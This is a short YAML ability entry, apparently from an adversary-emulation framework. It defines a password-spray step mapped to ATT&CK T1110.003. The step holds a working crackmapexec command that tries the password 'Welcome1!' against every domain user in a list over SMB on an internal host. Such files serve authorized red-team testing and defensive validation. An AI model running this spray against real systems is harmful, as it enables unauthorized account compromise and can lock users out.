- id: ca08-password-spray
  name: Password Spray Domain Users
  description: Spray common password Welcome1! against all domain user accounts
  tactic: credential-access
  technique:
    attack_id: T1110.003
    name: Brute Force - Password Spraying
  platforms:
    linux:
      sh:
        command: |
          crackmapexec smb 10.0.20.101 -u /tmp/domain_users.txt -p 'Welcome1!' --continue-on-success 2>/dev/null | grep '+' || echo 'Password spray attempted'

  singleton: false
  repeatable: false
